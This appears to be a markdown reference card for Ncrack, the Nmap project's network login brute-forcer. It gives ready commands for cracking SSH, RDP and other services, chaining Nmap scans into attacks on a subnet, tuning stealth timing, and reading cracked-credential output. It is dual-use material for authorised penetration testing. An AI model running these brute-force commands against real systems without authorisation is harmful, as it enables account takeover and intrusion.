# Ncrack - High-Speed Auth Cracker

## Overview
| Attribute | Value |
|-----------|-------|
| Binary | `ncrack` |
| Category | Credential Brute-forcing |
| Risk Level | High |

## Description
Ncrack is a high-speed network authentication cracker designed by the Nmap project. It uses a modular approach and supports multiple protocols with timing options similar to Nmap.

---

## Supported Protocols
`ssh`, `rdp`, `ftp`, `telnet`, `http`, `https`, `pop3`, `pop3s`, `imap`, `imaps`, `smb`, `smb2`, `vnc`, `redis`, `postgresql`, `mysql`, `mssql`, `mongodb`, `cassandra`, `winrm`, `owa` (Outlook Web Access)

---

## Usage Patterns

### 1. Basic SSH Attack
**Goal:** Brute-force SSH.
```bash
ncrack -p ssh <target>
```
With credentials:
```bash
ncrack -p ssh --user root -P passwords.txt <target>
```

### 2. RDP Attack
**Goal:** Crack Remote Desktop.
```bash
ncrack -p rdp --user administrator -P passwords.txt <target>
```

### 3. Multiple Services
**Goal:** Attack multiple ports/services.
```bash
ncrack -p ssh,ftp,rdp <target>
```

### 4. From Nmap Output
**Goal:** Use Nmap service scan results.
```bash
nmap -sV -oX scan.xml <target>
ncrack -iX scan.xml --user admin -P passwords.txt
```

### 5. Custom Port
**Goal:** Specify non-default port.
```bash
ncrack <target>:2222 -p ssh --user root -P passwords.txt
```

### 6. Timing Templates
**Goal:** Adjust speed/stealth.
```bash
ncrack -T3 -p ssh --user root -P passwords.txt <target>
```

Timing templates:
- `-T0` to `-T2`: Slow, stealthy
- `-T3`: Normal (default)
- `-T4` to `-T5`: Fast, aggressive

### 7. Connection Limits
**Goal:** Fine-tune parallelism.
```bash
ncrack -p ssh --user root -P passwords.txt -g cl=10,CL=50 <target>
```
- `cl`: Minimum connections
- `CL`: Maximum connections

---

## Important Options
| Flag | Description |
|------|-------------|
| `-p` | Service/protocol |
| `--user` | Single username |
| `-U` | Username file |
| `--pass` | Single password |
| `-P` | Password file |
| `-T<0-5>` | Timing template |
| `-iX` | Input from Nmap XML |
| `-iL` | Input from host list |
| `-oN` | Normal output |
| `-oX` | XML output |
| `-g` | Per-service options |
| `-f` | Stop on first found |
| `-v` / `-vv` | Verbose output |

---

## Per-Service Options (-g)
| Option | Description |
|--------|-------------|
| `cl` | Minimum parallel connections |
| `CL` | Maximum parallel connections |
| `at` | Authentication tries per connection |
| `cd` | Connection delay (ms) |
| `cr` | Connection retries |
| `to` | Timeout (seconds) |

**Example:**
```bash
ncrack -p ssh -g cl=5,CL=20,at=3 --user root -P pass.txt <target>
```

---

## Integration with Nmap
Ncrack integrates seamlessly with Nmap:

```bash
# 1. Scan for services
nmap -sV -oX results.xml 192.168.1.0/24

# 2. Crack discovered services
ncrack -iX results.xml -U users.txt -P passwords.txt
```

---

## Safety Warnings
| Risk | Description |
|------|-------------|
| **Account Lockout** | RDP/SMB often have lockout |
| **Detection** | High connection rate detected |
| **Crashes** | Aggressive timing may crash services |

> **Tip:** Use `-T2` for sensitive targets.

---

## Comparison with Hydra/Medusa
| Aspect | Ncrack | Hydra | Medusa |
|--------|--------|-------|--------|
| Speed | Very Fast | Fast | Fast |
| Timing Control | Excellent (Nmap-style) | Basic | Basic |
| Nmap Integration | Native | None | None |
| HTTP Forms | None | Excellent | Limited |
| Stability | Good | Good | Excellent |

> **Recommendation:** Use Ncrack when working with Nmap scan results.

---

## Output Parsing
Success format:
```
Discovered credentials for ssh on 192.168.1.10 22/tcp:
192.168.1.10 22/tcp ssh: 'root' 'toor'
```
